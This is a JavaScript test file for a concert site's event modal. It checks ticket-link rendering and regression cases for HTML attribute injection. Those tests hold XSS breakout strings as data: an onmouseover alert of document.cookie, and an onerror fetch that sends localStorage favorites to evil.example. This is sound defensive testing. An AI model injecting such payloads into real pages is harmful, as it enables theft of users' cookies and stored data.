// Tests for the ticket-anchor render paths in ../js/modal.js.
//
// modal.js is a plain <script> (no module.exports) that touches `document` at load
// time, so it can't be `require()`d directly under Node's test runner. It goes through
// the shared loader in ./helpers/load-script.js instead, which evaluates it into a vm
// context with a minimal DOM stub — top-level function declarations become properties
// of the sandbox object, so tests here call modal.js's actual `_buildEventRow` /
// `openModal` template code, not a reimplementation of it.
//
// Covers two things:
//  - The modal must not hard-depend on /js/analytics.js: if that script is blocked,
//    404s, or is missing from a stale cached index.html, `ticketAnchorAttrs` is
//    undefined when modal.js runs. Both render sites must still produce a well-formed
//    anchor instead of throwing (which previously killed the modal for every show
//    with a ticket URL — see modal.js:33/:133).
//  - When analytics.js *has* loaded, the rendered anchor markup must carry the class
//    analytics.js's delegated click listener selects on (TICKET_ANCHOR_SELECTOR)
//    alongside the data-* attributes. The expected class below is parsed out of that
//    exported constant rather than hardcoded, so a selector change on either side
//    (the constant, or the class either render site emits) turns this suite red.

const { test } = require("node:test");
const assert = require("node:assert/strict");
const { loadScripts, stubElement, stubDocument } = require("./helpers/load-script.js");
const { TICKET_ANCHOR_SELECTOR } = require("../js/analytics.js");

// TICKET_ANCHOR_SELECTOR is a CSS selector like "a.btn-tickets"; pull the class token
// back out of it so assertions below check the render sites against the real constant
// instead of a copy-pasted literal.
const _selectorMatch = /^[a-z]+\.([\w-]+)$/.exec(TICKET_ANCHOR_SELECTOR);
if (!_selectorMatch) {
  throw new Error(`TICKET_ANCHOR_SELECTOR "${TICKET_ANCHOR_SELECTOR}" isn't a simple tag.class selector`);
}
const TICKET_ANCHOR_CLASS = _selectorMatch[1];

// Loads modal.js into a fresh sandbox alongside the three elements it looks up at load
// time. When `withAnalytics` is true, analytics.js is loaded into the same context
// first, so `ticketAnchorAttrs` is a real global by the time modal.js runs — simulating
// a normal page load. When false, it is left undefined — simulating analytics.js being
// blocked, 404ing, or missing from a stale cached index.html.
function loadModal({ withAnalytics }) {
  const elements = {
    "event-modal": stubElement(),
    "modal-overlay": stubElement(),
    "modal-content": stubElement(),
  };
  const scripts = withAnalytics ? ["js/analytics.js", "js/modal.js"] : ["js/modal.js"];
  const { sandbox } = loadScripts(scripts, { documentStub: stubDocument(elements) });
  return { sandbox, elements };
}

test("_buildEventRow (group modal row) renders a well-formed ticket anchor without throwing when analytics.js hasn't loaded", () => {
  const { sandbox } = loadModal({ withAnalytics: false });
  const ev = {
    id: "42",
    title: "Show Title",
    extendedProps: {
      venue_slug: "cats-cradle",
      ticket_url: "https://tickets.example.com/42",
      support_artists: [],
    },
  };

  let html;
  assert.doesNotThrow(() => {
    html = sandbox._buildEventRow(ev);
  });
  assert.match(
    html,
    /<a href="https:\/\/tickets\.example\.com\/42" target="_blank" rel="noopener" class="[^"]*"\s*>Get Tickets<\/a>/
  );
  assert.match(html, new RegExp(`class="${TICKET_ANCHOR_CLASS} btn-tickets-sm"`));
  assert.equal(html.includes("data-venue-slug"), false);
  assert.equal(html.includes("data-show-id"), false);
});

test("openModal (single-event modal) renders a well-formed ticket anchor without throwing when analytics.js hasn't loaded", () => {
  const { sandbox, elements } = loadModal({ withAnalytics: false });
  const eventInfo = {
    event: {
      id: "42",
      extendedProps: {
        date: "2026-08-08",
        name: "Show Name",
        venue_slug: "cats-cradle",
        venue_name: "Cat's Cradle",
        venue_city: "Carrboro",
        ticket_url: "https://tickets.example.com/42",
      },
    },
  };

  assert.doesNotThrow(() => sandbox.openModal(eventInfo));
  const html = elements["modal-content"].innerHTML;
  assert.match(
    html,
    /<a href="https:\/\/tickets\.example\.com\/42" target="_blank" rel="noopener" class="[^"]*"\s*>Get Tickets<\/a>/
  );
  assert.match(html, new RegExp(`class="${TICKET_ANCHOR_CLASS}"`));
  assert.equal(html.includes("data-venue-slug"), false);
  assert.equal(html.includes("data-show-id"), false);
  // Confirms the modal actually opened: classList.add("active") ran against the real
  // #event-modal element, not just that the stub still has an `add` method.
  assert.deepEqual(elements["event-modal"].classList.addedClasses, ["active"]);
});

test("_buildEventRow carries class=\"btn-tickets\" alongside the real data-* attributes when analytics.js has loaded", () => {
  const { sandbox } = loadModal({ withAnalytics: true });
  const ev = {
    id: "42",
    title: "Show Title",
    extendedProps: {
      venue_slug: "cats-cradle",
      ticket_url: "https://tickets.example.com/42",
      support_artists: [],
    },
  };

  const html = sandbox._buildEventRow(ev);
  assert.match(html, new RegExp(`class="${TICKET_ANCHOR_CLASS} btn-tickets-sm"`));
  assert.match(html, /data-venue-slug="cats-cradle"/);
  assert.match(html, /data-show-id="42"/);
});

test("openModal carries class=\"btn-tickets\" alongside the real data-* attributes when analytics.js has loaded", () => {
  const { sandbox, elements } = loadModal({ withAnalytics: true });
  const eventInfo = {
    event: {
      id: "42",
      extendedProps: {
        date: "2026-08-08",
        name: "Show Name",
        venue_slug: "cats-cradle",
        venue_name: "Cat's Cradle",
        venue_city: "Carrboro",
        ticket_url: "https://tickets.example.com/42",
      },
    },
  };

  sandbox.openModal(eventInfo);
  const html = elements["modal-content"].innerHTML;
  assert.match(html, new RegExp(`class="${TICKET_ANCHOR_CLASS}"`));
  assert.match(html, /data-venue-slug="cats-cradle"/);
  assert.match(html, /data-show-id="42"/);
});

// --- Attribute-injection regression coverage (issue #94) ---
//
// image_url and ticket_url are scraper-sourced from 21+ third-party venue sites and
// were, before this fix, interpolated raw into `<img src>`/`<a href>` while every
// neighbouring field went through _h(). ticket_url's `/^https?:\/\//i` prefix check
// (safeUrl) only constrains how the string *starts* — it does not stop a `"` later in
// the string from closing the attribute early. These tests assert the closing quote
// is neutralized at every render site, and that well-formed URLs are unaffected.

// A `"` placed after a real https:// prefix still passes the safeUrl prefix check,
// which is exactly why that check alone was never sufficient — only escaping closes
// the gap.
const TICKET_URL_BREAKOUT = 'https://evil.example/show?ref=1" onmouseover="alert(document.cookie)';
// image_url has no prefix check at all in modal.js; a broken `src` fires `onerror`
// the moment the modal opens, no click required.
const IMAGE_URL_BREAKOUT = 'x" onerror="fetch(\'//evil.example/\'+localStorage.getItem(\'triangle-shows-favorites\'))';

function _assertNoAttributeBreakout(html) {
  // The actual vulnerability signature: a *raw* `"` immediately followed by an
  // onerror=/onmouseover= attribute — that's what a successful break-out renders
  // as (the injected quote closing src/href early, followed by a sibling event
  // handler attribute). A raw `"` only ever appears there if escaping failed; once
  // _h() runs, that quote is `&quot;` (an entity, not a `"` character), so this
  // regex — unlike a plain substring/word check — does not false-positive on the
  // harmless case where "onerror=" merely appears as escaped text *inside* the
  // original, still-intact src/href attribute value.
  assert.equal(/"\s+on(error|mouseover)\s*=/.test(html), false);
}

test("_buildEventRow (group modal row) escapes a double-quote in ticket_url so it can't break out of the <a> attribute", () => {
  const { sandbox } = loadModal({ withAnalytics: false });
  const ev = {
    id: "42",
    title: "Show Title",
    extendedProps: {
      venue_slug: "cats-cradle",
      ticket_url: TICKET_URL_BREAKOUT,
      support_artists: [],
    },
  };

  const html = sandbox._buildEventRow(ev);
  _assertNoAttributeBreakout(html);
  assert.match(
    html,
    /href="https:\/\/evil\.example\/show\?ref=1&quot; onmouseover=&quot;alert\(document\.cookie\)"/
  );
});

test("openModal (single-event modal) escapes a double-quote in ticket_url so it can't break out of the <a> attribute", () => {
  const { sandbox, elements } = loadModal({ withAnalytics: false });
  const eventInfo = {
    event: {
      id: "42",
      extendedProps: {
        date: "2026-08-08",
        name: "Show Name",
        venue_slug: "cats-cradle",
        venue_name: "Cat's Cradle",
        venue_city: "Carrboro",
        ticket_url: TICKET_URL_BREAKOUT,
      },
    },
  };

  sandbox.openModal(eventInfo);
  const html = elements["modal-content"].innerHTML;
  _assertNoAttributeBreakout(html);
  assert.match(
    html,
    /href="https:\/\/evil\.example\/show\?ref=1&quot; onmouseover=&quot;alert\(document\.cookie\)"/
  );
});

test("openModal escapes a double-quote in image_url so the onerror payload can't reach the <img> attribute", () => {
  const { sandbox, elements } = loadModal({ withAnalytics: false });
  const eventInfo = {
    event: {
      id: "42",
      extendedProps: {
        date: "2026-08-08",
        name: "Show Name",
        venue_slug: "cats-cradle",
        venue_name: "Cat's Cradle",
        venue_city: "Carrboro",
        image_url: IMAGE_URL_BREAKOUT,
      },
    },
  };

  sandbox.openModal(eventInfo);
  const html = elements["modal-content"].innerHTML;
  _assertNoAttributeBreakout(html);
  // The whole payload, quotes included, must land inside one escaped src="..."
  // attribute rather than spilling into a sibling onerror="..." attribute.
  assert.match(
    html,
    /<img src="x&quot; onerror=&quot;fetch\('\/\/evil\.example\/'\+localStorage\.getItem\('triangle-shows-favorites'\)\)" alt="Show Name" class="modal-image">/
  );
});

test("openModal renders a well-formed https ticket_url with query params as an identical working link", () => {
  const { sandbox, elements } = loadModal({ withAnalytics: false });
  const url = "https://tickets.example.com/42?ref=abc&utm_source=site";
  const eventInfo = {
    event: {
      id: "42",
      extendedProps: {
        date: "2026-08-08",
        name: "Show Name",
        venue_slug: "cats-cradle",
        venue_name: "Cat's Cradle",
        venue_city: "Carrboro",
        ticket_url: url,
      },
    },
  };

  sandbox.openModal(eventInfo);
  const html = elements["modal-content"].innerHTML;
  // & is escaped to &amp; in the attribute (correct HTML), which the browser
  // resolves back to the identical URL — it is not a behavior change.
  assert.match(html, /href="https:\/\/tickets\.example\.com\/42\?ref=abc&amp;utm_source=site"/);
});

test("openModal renders a well-formed image_url with query params as an identical working <img src>", () => {
  const { sandbox, elements } = loadModal({ withAnalytics: false });
  const url = "https://cdn.example.com/poster.jpg?w=800&h=600";
  const eventInfo = {
    event: {
      id: "42",
      extendedProps: {
        date: "2026-08-08",
        name: "Show Name",
        venue_slug: "cats-cradle",
        venue_name: "Cat's Cradle",
        venue_city: "Carrboro",
        image_url: url,
      },
    },
  };

  sandbox.openModal(eventInfo);
  const html = elements["modal-content"].innerHTML;
  assert.match(html, /<img src="https:\/\/cdn\.example\.com\/poster\.jpg\?w=800&amp;h=600" alt="Show Name" class="modal-image">/);
});

// --- _h() must not throw on a non-string value ---
//
// The fields _h() receives come from JSON the API returns, and nothing in the client
// type-checks them. `(s || "")` passes any *truthy* non-string straight through to
// .replace(), which only exists on String.prototype — so a numeric image_url threw a
// TypeError inside openModal and the modal never opened at all. Coercing with
// String(s == null ? "" : s) (matching analytics.js::_escapeAttr) escapes the value
// instead. Only image_url is exercised here because it is the one _h() call site
// whose guard (`props.image_url ? …`) is a bare truthiness check, so a non-string
// reaches _h() unfiltered; safeUrl is incidentally shielded because RegExp.test()
// coerces its argument before _h() ever sees it.

test("openModal renders a non-string image_url as escaped text instead of throwing", () => {
  const { sandbox, elements } = loadModal({ withAnalytics: false });
  const eventInfo = {
    event: {
      id: "42",
      extendedProps: {
        date: "2026-08-08",
        name: "Show Name",
        venue_slug: "cats-cradle",
        venue_name: "Cat's Cradle",
        venue_city: "Carrboro",
        image_url: 12345,
      },
    },
  };

  assert.doesNotThrow(() => sandbox.openModal(eventInfo));
  const html = elements["modal-content"].innerHTML;
  assert.match(html, /<img src="12345" alt="Show Name" class="modal-image">/);
  // The rest of the modal still rendered — a throw here used to abort openModal
  // partway and leave modal-content empty.
  assert.match(html, /<h2>Show Name<\/h2>/);
});

test("_h escapes a non-string that carries an attribute-breakout payload in its toString", () => {
  const { sandbox } = loadModal({ withAnalytics: false });
  // An object whose toString() carries the payload: coercion must happen *before*
  // escaping, never instead of it.
  const hostile = { toString: () => 'x" onerror="alert(1)' };

  assert.equal(sandbox._h(hostile), "x&quot; onerror=&quot;alert(1)");
});

test("_h maps null and undefined to the empty string", () => {
  const { sandbox } = loadModal({ withAnalytics: false });

  assert.equal(sandbox._h(null), "");
  assert.equal(sandbox._h(undefined), "");
});
